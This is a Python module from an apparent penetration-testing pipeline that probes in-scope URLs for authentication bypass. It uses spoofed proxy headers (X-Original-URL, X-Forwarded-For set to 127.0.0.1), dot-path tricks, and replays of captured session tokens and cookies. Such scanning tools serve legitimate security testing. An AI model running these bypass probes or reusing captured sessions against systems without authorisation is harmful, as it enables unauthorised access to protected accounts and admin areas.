from __future__ import annotations

import hashlib
import json
import asyncio
from collections import defaultdict
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage
from recon_cli.utils import time as time_utils
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class AuthBypassValidatorStage(Stage):
    name = "auth_bypass_validator"

    SUCCESS_STATUS = {200, 201, 202, 204, 206}
    AUTH_BLOCK_STATUS = {401, 403}
    AUTH_HINTS = (
        "unauthorized", "forbidden", "access denied", "login required", "authentication required",
    )
    SENSITIVE_PATH_HINTS = (
        "/admin", "/internal", "/manage", "/management", "/dashboard",
        "/account", "/settings", "/tenant", "/billing", "/api/private",
    )

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_auth_bypass_validator", True))

    async def run_async(self, context: PipelineContext) -> None:
        runtime = context.runtime_config
        max_urls = max(1, int(getattr(runtime, "auth_bypass_validator_max_urls", 25)))
        max_per_host = max(1, int(getattr(runtime, "auth_bypass_validator_max_per_host", 6)))
        timeout = max(1, int(getattr(runtime, "auth_bypass_validator_timeout", 10)))
        verify_tls = bool(getattr(runtime, "verify_tls", True))
        enable_forced_browse = bool(getattr(runtime, "auth_bypass_validator_enable_forced_browse", True))
        enable_boundary = bool(getattr(runtime, "auth_bypass_validator_enable_privilege_boundary", True))
        
        candidates = self._collect_candidates(context, min_score=int(getattr(runtime, "auth_bypass_validator_min_score", 35)), max_urls=max_urls, max_per_host=max_per_host)
        stats = context.record.metadata.stats.setdefault("auth_bypass_validator", {})
        if not candidates:
            stats.update({"attempted": 0, "confirmed": 0, "confirmed_forced": 0, "confirmed_boundary": 0, "failed": 0, "skipped": 0})
            context.manager.update_metadata(context.record)
            context.logger.info("No auth bypass validator candidates")
            return

        attempted = 0
        confirmed = 0
        confirmed_forced = 0
        confirmed_boundary = 0
        failed = 0
        skipped = 0
        artifacts: List[Dict[str, object]] = []
        session_cache: Dict[str, List[Tuple[str, str]]] = {}

        client_config = HTTPClientConfig(
            max_concurrent=15,
            total_timeout=float(timeout),
            verify_ssl=verify_tls,
            requests_per_second=float(getattr(runtime, "auth_bypass_validator_rps", 20.0))
        )

        async with AsyncHTTPClient(client_config) as client:
            for candidate in candidates:
                url = str(candidate.get("url") or "")
                if not url or not context.url_allowed(url):
                    skipped += 1; continue
                
                parsed_url = urlparse(url)
                host = parsed_url.hostname or ""
                path = str(parsed_url.path or "/")

                # Resolve tokens
                if host not in session_cache:
                    host_tokens = []
                    t_a = str(getattr(runtime, "idor_token_a", "") or "").strip()
                    t_b = str(getattr(runtime, "idor_token_b", "") or "").strip()
                    if t_a: host_tokens.append(("token-a", t_a))
                    if t_b: host_tokens.append(("token-b", t_b))
                    if not host_tokens:
                        try:
                            art_path = context.record.paths.artifact(f"sessions_{host}.json")
                            if art_path.exists():
                                from recon_cli.utils import fs
                                sessions = fs.read_json(art_path)
                                for idx, sess in enumerate(sessions[:2]):
                                    stoken = ""
                                    if "access_token" in sess.get("tokens", {}): stoken = f"Bearer {sess['tokens']['access_token']}"
                                    elif sess.get("cookies"): stoken = "; ".join([f"{k}={v}" for k, v in sess["cookies"].items()])
                                    if stoken: host_tokens.append((f"captured-session-{idx+1}", stoken))
                        except Exception: pass
                    session_cache[host] = host_tokens

                tokens = session_cache[host]
                
                # Baseline
                baseline_resp = await self._fetch(client, context, "GET", url, headers={"User-Agent": "recon-cli auth-bypass-validator"})
                attempted += 1
                if baseline_resp is None:
                    failed += 1; continue

                restricted = self._is_auth_restricted(
                    status=baseline_resp["status"], text=baseline_resp["text"], 
                    location=baseline_resp.get("location", ""), hinted=bool(candidate.get("restricted_hint"))
                )

                finding: Optional[Dict[str, object]] = None

                if enable_forced_browse and restricted:
                    for technique in self._forced_browse_techniques(url, path):
                        test_url = str(technique["url"])
                        if not context.url_allowed(test_url): continue
                        headers = {"User-Agent": "recon-cli auth-bypass-validator"}
                        headers.update(dict(technique.get("headers") or {}))
                        
                        resp = await self._fetch(client, context, "GET", test_url, headers=headers)
                        attempted += 1
                        if resp is None:
                            failed += 1; continue
                        
                        artifacts.append({"timestamp": time_utils.iso_now(), "kind": "forced_browse_probe", "url": url, "test_url": test_url, "technique": technique["name"], "status": resp["status"]})
                        
                        if not self._is_auth_restricted(status=resp["status"], text=resp["text"], location=resp.get("location", ""), hinted=False) and int(resp["status"]) in self.SUCCESS_STATUS:
                            signal_id = context.emit_signal("auth_bypass_confirmed", "url", url, confidence=1.0, source=self.name, tags=["auth-bypass", "forced-browse", "confirmed"], evidence={"technique": technique["name"], "status_code": resp["status"]})
                            finding = {
                                "type": "finding", "finding_type": "auth_bypass", "source": self.name, "url": url, "hostname": host,
                                "description": "Authentication bypass confirmed using forced-browse technique",
                                "details": {"reason": "forced_browse_bypass", "technique": technique["name"], "probe_url": test_url, "baseline_status": baseline_resp["status"], "bypass_status": resp["status"]},
                                "proof": f"{technique['name']} -> {resp['status']}", "tags": ["auth-bypass", "forced-browse", "confirmed"],
                                "score": max(90, int(candidate.get("score", 0) or 0)), "priority": "high", "severity": "critical", "confidence_label": "verified", "evidence_id": signal_id or None,
                            }
                            break

                if finding is None and enable_boundary and len(tokens) >= 2 and self._is_sensitive_target(url):
                    auth_profiles = {}
                    for label, token in tokens:
                        resp = await self._fetch(client, context, "GET", url, headers={"User-Agent": "recon-cli auth-bypass-validator", "Authorization": token})
                        attempted += 1
                        if resp: auth_profiles[label] = resp
                    
                    finding = self._evaluate_boundary_issue(url, candidate, baseline_resp, auth_profiles)
                    if finding:
                        artifacts.append({
                            "timestamp": time_utils.iso_now(), "kind": "privilege_boundary_probe", "url": url, 
                            "baseline_status": baseline_resp["status"], 
                            "token_a_status": auth_profiles.get("token-a", {}).get("status", 0),
                            "token_b_status": auth_profiles.get("token-b", {}).get("status", 0),
                            "reason": finding.get("details", {}).get("reason")
                        })

                if finding and context.results.append(finding):
                    confirmed += 1
                    if (finding.get("details") or {}).get("reason") == "forced_browse_bypass": confirmed_forced += 1
                    else: confirmed_boundary += 1

        # Save artifacts and stats
        artifacts_dir = context.record.paths.ensure_subdir("auth_bypass_validator")
        artifact_path = artifacts_dir / "auth_bypass_validator.json"
        artifact_path.write_text(json.dumps({"timestamp": time_utils.iso_now(), "probes": artifacts, "confirmed": confirmed, "confirmed_forced": confirmed_forced, "confirmed_boundary": confirmed_boundary}, indent=2, sort_keys=True), encoding="utf-8")
        
        stats.update({"attempted": attempted, "confirmed": confirmed, "confirmed_forced": confirmed_forced, "confirmed_boundary": confirmed_boundary, "failed": failed, "skipped": skipped, "candidates": len(candidates), "artifact": str(artifact_path.relative_to(context.record.paths.root))})
        context.manager.update_metadata(context.record)

    async def _fetch(
        self,
        client: AsyncHTTPClient,
        context: PipelineContext,
        method: str,
        url: str,
        *,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        try:
            resp = await client._request(method=method, url=url, headers=headers, follow_redirects=False)
        except Exception:
            return None
            
        status = resp.status
        text = resp.body[:4000]
        location = str(resp.headers.get("Location", ""))
        body_hash = hashlib.md5(text.encode("utf-8", errors="ignore"), usedforsecurity=False).hexdigest() if text else ""
        
        return {"status": status, "text": text, "location": location, "hash": body_hash}

    def _collect_candidates(self, context: PipelineContext, *, min_score: int, max_urls: int, max_per_host: int) -> List[Dict[str, Any]]:
        grouped = defaultdict(list)
        seen = set()
        for entry in context.iter_results():
            url = str(entry.get("url") or "").strip()
            if not url or url in seen or not context.url_allowed(url): continue
            
            host = urlparse(url).hostname or ""
            score = int(entry.get("score", 0) or 0)
            status = int(entry.get("status_code") or entry.get("variant_status") or 0)
            tags = {str(t).lower() for t in entry.get("tags", [])}
            
            restricted_hint = status in self.AUTH_BLOCK_STATUS or "auth:challenge" in tags
            if score < min_score and not restricted_hint: continue
            if not restricted_hint and not self._is_sensitive_target(url): continue
            
            seen.add(url)
            priority = score + (30 if restricted_hint else 0) + (20 if self._is_sensitive_target(url) else 0)
            grouped[host].append({"url": url, "score": score, "priority": priority, "restricted_hint": restricted_hint})
            
        selected = []
        for items in grouped.values():
            items.sort(key=lambda x: x["priority"], reverse=True)
            selected.extend(items[:max_per_host])
        selected.sort(key=lambda x: x["priority"], reverse=True)
        return selected[:max_urls]

    def _forced_browse_techniques(self, base_url: str, path: str) -> List[Dict[str, Any]]:
        safe_path = path if path.startswith("/") else f"/{path}"
        parsed = urlparse(base_url)
        base_clean = urlunparse(parsed._replace(path=safe_path, query="", fragment=""))
        return [
            {"name": "x_original_url", "url": base_clean, "headers": {"X-Original-URL": safe_path}},
            {"name": "x_rewrite_url", "url": base_clean, "headers": {"X-Rewrite-URL": safe_path}},
            {"name": "x_custom_ip_auth", "url": base_clean, "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
            {"name": "x_forwarded_for", "url": base_clean, "headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"name": "x_forwarded_host", "url": base_clean, "headers": {"X-Forwarded-Host": "localhost"}},
            {"name": "x_host", "url": base_clean, "headers": {"X-Host": "localhost"}},
            {"name": "path_dot_bypass", "url": urlunparse(parsed._replace(path=safe_path.rstrip("/") + "/.", query="", fragment="")), "headers": {}},
            {"name": "path_encoded_dot_bypass", "url": urlunparse(parsed._replace(path=safe_path.rstrip("/") + "/%2e/", query="", fragment="")), "headers": {}},
        ]

    def _evaluate_boundary_issue(self, url: str, candidate: Dict[str, Any], baseline: Dict[str, Any], profiles: Dict[str, Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        token_a, token_b = profiles.get("token-a"), profiles.get("token-b")
        if not token_a or not token_b: return None
        if int(token_a.get("status", 0)) not in self.SUCCESS_STATUS or int(token_b.get("status", 0)) not in self.SUCCESS_STATUS: return None
        if not (token_a.get("hash") and token_a.get("hash") == token_b.get("hash")): return None

        b_status = int(baseline.get("status", 0))
        b_hash = str(baseline.get("hash") or "")
        if b_status in self.SUCCESS_STATUS and b_hash and b_hash == str(token_a.get("hash")):
            return {
                "type": "finding", "finding_type": "auth_bypass", "source": self.name, "url": url, "hostname": urlparse(url).hostname,
                "description": "Authorization boundary weakness: unauthenticated matches authenticated",
                "details": {"reason": "unauthenticated_matches_authenticated", "baseline_status": b_status, "token_a_status": token_a["status"], "token_b_status": token_b["status"]},
                "proof": "unauthenticated_matches_authenticated", "tags": ["auth-bypass", "unauthenticated", "confirmed"],
                "score": max(90, int(candidate.get("score", 0) or 0)), "priority": "high", "severity": "critical", "confidence_label": "verified",
            }
        return None

    def _is_sensitive_target(self, url: str) -> bool:
        lower = url.lower()
        return any(hint in lower for hint in self.SENSITIVE_PATH_HINTS)

    def _is_auth_restricted(self, *, status: int, text: str, location: str, hinted: bool) -> bool:
        if status in self.AUTH_BLOCK_STATUS: return True
        if any(hint in (text or "").lower() for hint in self.AUTH_HINTS): return True
        if any(h in (location or "").lower() for h in ["login", "signin"]): return True
        return hinted and status not in self.SUCCESS_STATUS
